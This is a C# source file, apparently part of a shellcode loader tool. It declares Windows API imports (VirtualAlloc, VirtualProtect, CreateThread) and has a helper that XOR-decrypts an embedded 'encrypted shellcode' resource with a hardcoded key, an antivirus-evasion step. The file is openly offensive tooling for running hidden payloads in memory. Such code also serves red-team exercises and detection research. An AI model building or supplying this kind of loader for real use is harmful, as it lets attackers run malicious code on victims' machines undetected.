using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace CreateThreadExample
{
    class Headers
    {
        // This is the encryption key for your shellcode
        public static char[] cryptor = new char[] { 'E', 'x', 'a', 'm', 'p', 'l', 'e', 'K', 'e', 'y', '\0' };

        #region API Calls

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        // https://pinvoke.net/default.aspx/coredll/WaitForSingleObject.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait);

        // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
        SECURITY_ATTRIBUTES lpThreadAttributes, // Don't need this
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        CreationFlags dwCreationFlags,
        ref IntPtr lpThreadId);

        #endregion

        #region Structs and Enums

        // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
        [Flags]
        public enum CreationFlags
        {
            Immediate = 0,
            CreateSuspended = 0x00000004,
            StackSizeParamIsAReservation = 0x00010000
        }

        // https://pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // https://pinvoke.net/default.aspx/kernel32/VirtualAlloc.html
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        #endregion

        #region Helper Functions

        public static byte[] GetAllDecryptedBytes()
        {
            // You'll need to ensure you have the encrypted shellcode
            // added as an embedded resource.
            byte[] rawData = Properties.Resources.encrypted;
            byte[] result = new byte[rawData.Length];
            int j = 0;

            for (int i = 0; i < rawData.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }
                byte res = (byte)(rawData[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }
            return result;
        }

        #endregion
    }
}
